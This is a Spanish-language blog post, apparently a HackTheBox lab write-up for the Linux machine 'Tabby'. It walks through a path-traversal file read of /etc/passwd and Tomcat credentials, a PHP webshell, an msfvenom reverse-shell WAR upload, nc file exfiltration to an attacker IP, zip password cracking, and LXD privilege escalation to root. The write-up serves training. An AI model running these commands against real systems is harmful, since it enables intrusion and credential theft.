@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Tabby</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Tabby | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Tabby" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil. Tabbyen, jugaremos con un LFI, buscaremos hasta más no poder un archivo de tomcat, explotaremos al manager para que nos permita entrar en la casa de tom, crackearemos un archivo .zip para despues aprovecharnos del grupo LXD y tener control total del sistema." />
+<meta property="og:description" content="Máquina Linux nivel fácil. Tabbyen, jugaremos con un LFI, buscaremos hasta más no poder un archivo de tomcat, explotaremos al manager para que nos permita entrar en la casa de tom, crackearemos un archivo .zip para despues aprovecharnos del grupo LXD y tener control total del sistema." />
+<link rel="canonical" href="http://localhost:4000/htb/tabby" />
+<meta property="og:url" content="http://localhost:4000/htb/tabby" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/bannertabby.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-11-07T00:00:00-08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/bannertabby.png" />
+<meta property="twitter:title" content="HackTheBox - Tabby" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2020-11-07T00:00:00-08:00","datePublished":"2020-11-07T00:00:00-08:00","description":"Máquina Linux nivel fácil. Tabbyen, jugaremos con un LFI, buscaremos hasta más no poder un archivo de tomcat, explotaremos al manager para que nos permita entrar en la casa de tom, crackearemos un archivo .zip para despues aprovecharnos del grupo LXD y tener control total del sistema.","headline":"HackTheBox - Tabby","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/bannertabby.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/tabby"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/tabby"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Tabby</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2020-11-07">07 Nov 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/bannertabby.png" alt="HackTheBox - Tabby">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil. Tabbyen, jugaremos con un LFI, buscaremos hasta más no poder un archivo de tomcat, explotaremos al manager para que nos permita entrar en la casa de tom, crackearemos un archivo .zip para despues aprovecharnos del grupo LXD y tener control total del sistema.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/tabbyHTB.png" alt="tabbyHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p>Bueeeeno, hola, empezaremos explotando una vulnerabilidad <strong>Local File Inclusion</strong>, la cual usaremos para ver el archivo <code>tomcat-users.xml</code> del paquete <strong>tomcat</strong> en la máquina y obtener las credenciales guardadas ahí… Explotaremos por medio del apartado <code>/manager</code> del servicio <strong>tomcat</strong> web un rol que nos permite subir archivos, subiremos un payload que al ejecutarlo nos de una reverse Shell. Estando en la máquina encontraremos un archivo de <strong>backup.zip</strong> el cual crackearemos y con la password encontrada lograremos migrar al usuario <strong>ash</strong>. Validando los grupos del usuario <strong>ash</strong> veremos que está dentro de <strong>lxd</strong>, explotaremos el grupo y usaremos esta info para obtener una Shell como <strong>root</strong>.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme :) (por si ves mucho texto a veces)</p>
+</blockquote>
+
+<p>Como siempre, tendremos 3 fases:</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a></li>
+  <li><a href="#explotacion">Explotación</a></li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración</h2>
+
+<p>Hacemos un escaneo de puertos con <code>nmap</code>, según la velocidad con la que vaya agregamos parámetros para hacerlo más rápido, eso si, validando que no se nos pierdan puertos.</p>
+
+<pre><code class="language-bash">─╼ $ nmap -p- --open -v 10.10.10.194
+</code></pre>
+
+<p>Pero va lento, agregando <code>-T</code> no cambia mucho, así que podemos usar <code>--min-rate</code>. (Sin embargo es importante hacer un escaneo total, sin cambios así vaya lento, que nos permita ver si <code>--min-rate</code> obvia algún puerto.</p>
+
+<pre><code class="language-bash">─╼ $ nmap -p- --open -v -Pn --min-rate=2000 10.10.10.194 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-T4</td>
+      <td style="text-align: left">Forma de escanear superrápido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al num que pongamos (i.e: –min-rate=5000)</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita que realice Host Discovery, tales como Ping (P) y DNS (n)</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable, ya que uso una función que me extrae los puertos</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">─╼ $ cat initScan 
+# Nmap 7.80 scan initiated Mon Oct  5 12:09:18 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.194
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.194 ()   Status: Up
+Host: 10.10.10.194 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8080/open/tcp//http-proxy///
+</code></pre>
+
+<p>Listo, obtenemos los puertos:</p>
+
+<ul>
+  <li>22: SSH</li>
+  <li>80: Servidor web</li>
+  <li>8080: Proxy</li>
+</ul>
+
+<p>Procedemos a nuestro escaneo de versiones y scripts.</p>
+
+<pre><code class="language-bash">─╼ $ nmap -p22,80,8080 -sC -sV 10.10.10.194 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">─╼ $ cat portScan
+# Nmap 7.80 scan initiated Mon Oct  5 12:16:03 2020 as: nmap -p22,80,8080 -sC -sV -oN portScan 10.10.10.194
+Nmap scan report for 10.10.10.194
+Host is up (0.19s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<p>Revisando cada versión con <code>searchsploit</code> no encontramos nada.</p>
+
+<h4 id="puerto-80">Puerto 80</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagemegahosting.png" alt="pagemegahosting" /></p>
+
+<p>Enumerando simplemente encontramos en el apartado <code>/news</code> que si entramos la <strong>URL</strong> cambia a <code>http://megahosting.htb/news.php?file=statement</code>. Por lo que debemos modificar en nuestro archivo <code>/etc/hosts</code> ese reconocimiento. Para que cuando la petición sea hacia el dominio <code>megahosting.htb</code> la resuelva la IP <code>10.10.10.194</code>.</p>
+
+<pre><code class="language-bash">─╼ $ cat /etc/hosts
+
+10.10.10.194  megahosting.htb
+</code></pre>
+
+<p>Si volvemos a entrar ahora si nos permite ver el contenido:</p>
+
+<blockquote>
+  <p>We apologise to all our customers for the previous data breach.
+We have changed the site to remove this tool, and have invested heavily in more secure servers</p>
+</blockquote>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación</h2>
+
+<p>Veamos la URL. Toma un argumento llamado <code>file</code>, lo que en nuestra cabeza puede significar que puede estar tomando cualquier archivo que le indiquemos… Por lo que posiblemente tengamos un <strong>Local/Remote File Inclusion</strong>, que nos permitiría ver e INCLUIR archivos en el sistema. Probemos ver un archivo local.</p>
+
+<p>Digámosle que nos muestre el archivo <code>/etc/passwd</code>.</p>
+
+<pre><code class="language-html">http://megahosting.htb/news.php?file=../../../../../../etc/passwd
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagepasswd.png" alt="pagepasswd" /></p>
+
+<pre><code class="language-bash">─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:997:997::/opt/tomcat:/bin/false
+mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+ash:x:1000:1000:clive:/home/ash:/bin/bash
+</code></pre>
+
+<p>Perfecto, tenemos <strong>Local</strong> (vemos un usuario <strong>ash</strong>), probemos <strong>Remote</strong>. Primero creemos un archivo que nos permita ejecutar comandos en el sistema por medio de un argumento.</p>
+
+<pre><code class="language-bash">─╼ $ cat shxcx.php
+
+&lt;?php shell_exec($_GET['xmd']); ?&gt;
+</code></pre>
+
+<p>Ahora montamos un servidor web rápidamente con python: <code>$ python3 -m http.server</code> y desde la URL le indicamos:</p>
+
+<pre><code class="language-html">http://megahosting.htb/news.php?file=http://10.10.15.86:8000/shxcx.php?xmd=pwd
+</code></pre>
+
+<p>Pero no obtenemos respuesta, por lo tanto nos quedaremos con el <em>Local File Inclusion</em>.</p>
+
+<p>…</p>
+
+<p>Podemos revisar procesos en el directorio <code>/proc/...</code> pero no tenemos nada relevante.</p>
+
+<h4 id="puerto-8080">Puerto 8080</h4>
+
+<p>(Esta imagen se me olvido tomarla, buscando en otros writeups <a href="http://www.whatinfotech.com/hackthebox-tabby-writeup/">la encontre perfecta acá :)</a>)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagetomcat.png" alt="pagetomcat" /></p>
+
+<p>Nos topamos con la página por default de <strong>tomcat</strong>, veamos que nos cuenta… Varias cosas interesantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Descripción</th>
+      <th style="text-align: left">Ruta</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Rules</td>
+      <td style="text-align: left">/usr/share/doc/tomcat9-common/RUNNING.txt.gz</td>
+    </tr>
+    <tr>
+      <td>CATALINA_HOME</td>
+      <td style="text-align: left">/usr/share/tomcat9</td>
+    </tr>
+    <tr>
+      <td>CATALINA_BASE</td>
+      <td style="text-align: left">/var/lib/tomcat9</td>
+    </tr>
+    <tr>
+      <td>Local filesystem</td>
+      <td style="text-align: left">/var/lib/tomcat9/webapps/ROOT/index.html</td>
+    </tr>
+    <tr>
+      <td>Users</td>
+      <td style="text-align: left">/etc/tomcat9/tomcat-users.xml</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Tenemos esa “estructura” de archivos, la más interesante claramente es la que relaciona <strong>Users</strong>, usando el LFI para leer el contenido no obtenemos ninguno… El archivo <strong>index.html</strong> si nos responde, pero es la misma información que estamos viendo en la página :)</p>
+
+<p>Buscando en internet indican dos cosas importantes:</p>
+
+<ul>
+  <li>Lo más común es que el archivo <code>tomcat-users.xml</code> este dentro de la carpeta <code>$CATALINA_HOME/conf/</code>, por lo que debemos empezar a buscar ahí…</li>
+  <li>El archivo tiene usuario y contraseña para poder entrar a los apartados <strong>manager webapp</strong> y <strong>host-manager webapp</strong></li>
+</ul>
+
+<p>Pero tampoco obtenemos salida. En una guia encontre que al momento de instalar tomcat necesitaremos un archivo de -servicio- y está guardado en <code>/etc/systemd/system/tomcat.service</code>, dentro del estarán las rutas que está usando <strong>CATALINA_HOME</strong> y <strong>CATALINA_BASE</strong>.</p>
+
+<pre><code class="language-bash">─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../../etc/systemd/system/tomcat.service
+
+[Unit]
+Description=Tomcat 9 servlet container
+After=network.target
+
+[Service]
+Type=forking
+
+User=tomcat
+Group=tomcat
+
+Environment="JAVA_HOME=/usr/lib/jvm/default-java"
+Environment="JAVA_OPTS=-Djava.security.egd=file:///dev/urandom -Djava.awt.headless=true"
+
+Environment="CATALINA_BASE=/opt/tomcat/latest"
+Environment="CATALINA_HOME=/opt/tomcat/latest"
+Environment="CATALINA_PID=/opt/tomcat/latest/temp/tomcat.pid"
+Environment="CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC"
+
+ExecStart=/opt/tomcat/latest/bin/startup.sh
+ExecStop=/opt/tomcat/latest/bin/shutdown.sh
+
+[Install]
+WantedBy=multi-user.target
+</code></pre>
+
+<p>Validando sobre ese <strong>CATALINA_HOME</strong> tampoco vemos salida del archivo <code>tomcat-users.xml</code>. Por lo tanto lo mejor es instalar localmente <strong>tomcat</strong> y ver como y donde se crean los archivos para así no ir a ciegas. Pero obtenemos la misma estructura que en internet y aún ningún output.</p>
+
+<p>Después de bastante tiempo intentando cosas me fui para el foro de HackThebox, una pista en la que simplemente referenciaba</p>
+
+<pre><code class="language-bash">sudo apt-get install ...
+find / -name...
+</code></pre>
+
+<p>Me hizo dudar si la persona que creo la máquina lo había hecho así y si esa manera creaba diferentes archivos en diferentes lados… Pues si:</p>
+
+<pre><code class="language-bash">─╼ $ sudo apt-get install tomcat9
+─╼ $ find / -name "tomcat-users.xml"
+
+/etc/tomcat9/tomcat-users.xml
+/opt/tomcat/conf/tomcat-users.xml
+/usr/share/tomcat9/etc/tomcat-users.xml
+</code></pre>
+
+<p>Y ahora haciendo la búsqueda sobre esa nueva ruta: <code>/usr/share/tomcat9/etc/tomcat-users.xml</code> tenemos credenciales:</p>
+
+<pre><code class="language-bash">─╼ $ curl -s http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+...
+...
+...
+   &lt;role rolename="admin-gui"/&gt;
+   &lt;role rolename="manager-script"/&gt;
+   &lt;user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/&gt;
+&lt;/tomcat-users&gt;
+</code></pre>
+
+<p>Listos, procedamos a validarlas</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/pagehostmanager.png" alt="pagehostmanager" /></p>
+
+<p>Estamos dentro, revisando el archivo <code>tomcat-users.xml</code> vemos dos roles:</p>
+
+<ul>
+  <li><strong>admin-gui</strong>: Nos permite entrar al <strong>/host-manager</strong>.</li>
+  <li><strong>manager-script</strong>: Nos va a permitir jugar con scripts. Démosle un vistazo a este</li>
+</ul>
+
+<p>Siguiendo <a href="https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00">esta guia</a> vemos la manera de ejecutar comandos en la máquina, podemos aprovecharnos de esto para obtener una reverse Shell. Todo pasa por que podemos subir un archivo malicioso .WAR</p>
+
+<blockquote>
+  <p>En computación, un archivo WAR es un archivo JAR utilizado para distribuir una colección de JavaServer Pages, servlets, clases Java, archivos XML… <a href="https://es.wikipedia.org/wiki/WAR_(archivo)">Wikipedia</a></p>
+</blockquote>
+
+<p>Lo primero es generar el archivo, podemos usar <code>msfvenom</code> para ello:</p>
+
+<blockquote>
+  <p>[Esta otra guia] nos explica como seria crear el archivo en vez de usar <code>msfvenom</code></p>
+</blockquote>
+
+<pre><code class="language-bash"># Creamos el archivo
+─╼ $ msfvenom -p java/shell_reverse_tcp lhost=10.10.15.86 lport=4433 -f war -o pwn.war
+
+# Subimos el archivo y lo alojamos en la ruta `/foo`
+─╼ $ curl -u tomcat:'$3cureP4s5w0rd123!' --upload-file pwn.war "http://10.10.10.194:8080/manager/text/deploy?path=/foo&amp;update=true"
+
+# Nos ponemos en escucha
+─╼ $ nc -nlvp 4433
+
+# Ejecutamos la petición
+─╼ $ curl -s http://10.10.10.194:8080/foo
+</code></pre>
+
+<pre><code class="language-bash">─╼ $ rlwrap nc -nlvp 4433
+listening on [any] 4433 ...
+connect to [10.10.15.86] from (UNKNOWN) [10.10.10.194] 38884
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+hostname
+tabby
+whoami
+tomcat
+cd /
+/
+script /dev/null -c bash
+Script started, file is /dev/null
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/bashtomcatshell.png" alt="bashtomcatshell" /></p>
+
+<p>Estamos dentro, ahora a enumerar :)</p>
+
+<p>Vemos el usuario <strong>ash</strong> en el directorio home, pero no tenemos acceso a el. Veamos que podemos usar para obtenerlo. Buscando de que archivos es owner el usuario <strong>tomcat</strong> no obtenemos nada relevante… Si lo hacemos con <strong>ash</strong> obtenemos esto:</p>
+
+<pre><code class="language-bash">tomcat@tabby:/var/lib/tomcat9$ find / -user ash -ls 2&gt;/dev/null | grep -v proc | grep -v sys
+   667268      4 drwxr-xr-x   4 ash      ash          4096 Jun 17 21:59 /var/www/html/files
+   655666     12 -rw-r--r--   1 ash      ash          8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip
+   794579      4 drwxr-x---   9 ash      ash          4096 Oct  8 21:58 /home/ash
+        2      0 drwx------   6 ash      ash           180 Oct  8 19:57 /run/user/1000
+</code></pre>
+
+<p>Pasemos ese archivo <code>.zip</code> a nuestra máquina e intentemos crackearlo.</p>
+
+<pre><code class="language-bash"># En nuestra maquina
+─╼ $ nc -lvp 4445 &gt; 16162020_backup.zip
+
+# En la maquina objetivo, con el `-w` le indicamos el timeout de espera
+tomcat@tabby:/var/lib/tomcat9$ md5sum /var/www/html/files/16162020_backup.zip
+tomcat@tabby:/var/lib/tomcat9$ nc -w 5 10.10.15.86 4445 &lt; /var/www/html/files/16162020_backup.zip
+
+# Despues en nuestra maquina validamos la integridad, si los dos hashes son iguales, prosigamos
+─╼ $ md5sum 16162020_backup.zip
+</code></pre>
+
+<p>Ahora usamos <strong>fcrackzip</strong></p>
+
+<pre><code class="language-bash">─╼ $ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 
+'var/www/html/assets/' is not encrypted, skipping
+found file 'var/www/html/favicon.ico', (size cp/uc    338/   766, flags 9, chk 7db5)
+'var/www/html/files/' is not encrypted, skipping
+found file 'var/www/html/index.php', (size cp/uc   3255/ 14793, flags 9, chk 5935)
+found file 'var/www/html/logo.png', (size cp/uc   2906/  2894, flags 9, chk 5d46)
+found file 'var/www/html/news.php', (size cp/uc    114/   123, flags 9, chk 5a7a)
+found file 'var/www/html/Readme.txt', (size cp/uc    805/  1574, flags 9, chk 6a8b)
+checking pw arizon1                                 
+
+PASSWORD FOUND!!!!: pw == admin@it 
+</code></pre>
+
+<ul>
+  <li>-v : Nos muestra el progreso de lo que va encontrando</li>
+  <li>-u : Para que intente descomprimir el archivo apenas encuentre la contraseña</li>
+  <li>-D : Modo diccionario</li>
+  <li>-p : Pasamos el diccionario que usará</li>
+</ul>
+
+<p>Listos, procedamos a ver que tenemos dentro… Pues nada importante. (Acá estuve un buen rato, enumerando y enumerando, ya que no sabía hacia donde ir).</p>
+
+<p>Pues resulta que si probamos en la máquina:</p>
+
+<pre><code class="language-bash">tomcat@tabby:/var/lib/tomcat9$ su ash
+Password: admin@it
+
+ash@tabby:/var/lib/tomcat9$
+</code></pre>
+
+<p>Estamos dentro como el usuario <strong>ash</strong> :P Tenemos el flag del user.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Inspeccionemos O.O</p>
+
+<p>Enumerando los grupos en los que esta <strong>ash</strong> vemos que está en el grupo <strong>lxd</strong>.</p>
+
+<pre><code class="language-bash">ash@tabby:/dev/shm$ id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+</code></pre>
+
+<p>De una recorde un video de <a href="https://www.youtube.com/watch?v=DJydodFguU4">s4vitar</a> en el que explota este grupo… De igual forma dejo unos artículos que también explican como aprovecharse del grupo para obtener una Shell como usuario administrador.</p>
+
+<ul>
+  <li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Hacking Articles</a>.</li>
+  <li><a href="https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/">Ethical Hacking Guru</a>.</li>
+  <li><a href="https://www.youtube.com/watch?v=DJydodFguU4">S4vitar</a>.</li>
+</ul>
+
+<p>Lo primero que debemos hacer es descargar y ejecutar en nuestra máquina atacante una imagen de un contenedor, en este caso usaremos <strong>alpine</strong>.</p>
+
+<pre><code class="language-bash">─╼ $ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
+─╼ $ chmod +x build-alpine
+─╼ # ./build-alpine
+...
+─╼ # ls
+alpine-v3.12-x86_64-20201007_0822.tar.gz  build-alpine
+</code></pre>
+
+<p>Nos generará la imagen y ese es el que moveremos a la máquina victima. Estando en la máquina victima haremos esto:</p>
+
+<pre><code class="language-bash"># Creamos el contenedor 
+ash@tabby:/dev/shm$ lxc image import alpine-v3.12-x86_64-20201007_0822.tar.gz --alias alpina
+ash@tabby:/dev/shm$ lxd init --auto
+# Desplegamos el contenedor
+ash@tabby:/dev/shm$ lxc init alpina privesc -c security.privileged=true
+Creating privesc
+# Le indicamos que nos haga una montura de todo el directorio raiz en la ruta `/mnt/root` 
+ash@tabby:/dev/shm$ lxc config device add privesc container disk source=/ path=/mnt/root recursive=true
+Device container added to privesc
+# Iniciamos el contenedor
+ash@tabby:/dev/shm$ lxc start privesc
+# Le indicamos que nos ejecute una shell con `sh`
+ash@tabby:/dev/shm$ lxc exec privesc sh
+~ # whoami
+root
+~ # cd /mnt/root
+/mnt/root # ls
+bin         home        lost+found  root        swap.img
+boot        lib         media       run         sys
+cdrom       lib32       mnt         sbin        tmp
+dev         lib64       opt         snap        usr
+etc         libx32      proc        srv         var
+/mnt/root #
+</code></pre>
+
+<p>Y listooooooooooooos, tenemos toda la raíz del sistema montada con el usuario <strong>root</strong>.</p>
+
+<p>Apenas terminemos lo nuestro, lo óptimo es borrar la imagen y el contenedor:</p>
+
+<pre><code class="language-bash">ash@tabby:/dev/shm$ lxc stop privesc
+ash@tabby:/dev/shm$ lxc delete privesc
+ash@tabby:/dev/shm$ lxc image delete alpina
+</code></pre>
+
+<p>Y tamos ganao’, las flags serían estas:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tabby/flagstabby.png" alt="flagstabby" /></p>
+
+<p>…</p>
+
+<p>Perfecto, linda maquina, el inicio fue un poco aterrador del enredo en le que estuve :P pero lo importante es no rendirse y lograrlo. La escalada de privilegios fue bonita y me recordo la hecha con docker en <strong>Cache</strong> :)</p>
+
+<p>Bueno, te agradezco el regalarme de tu tiempo y nada, a seguir rompiendo todo &lt;3</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
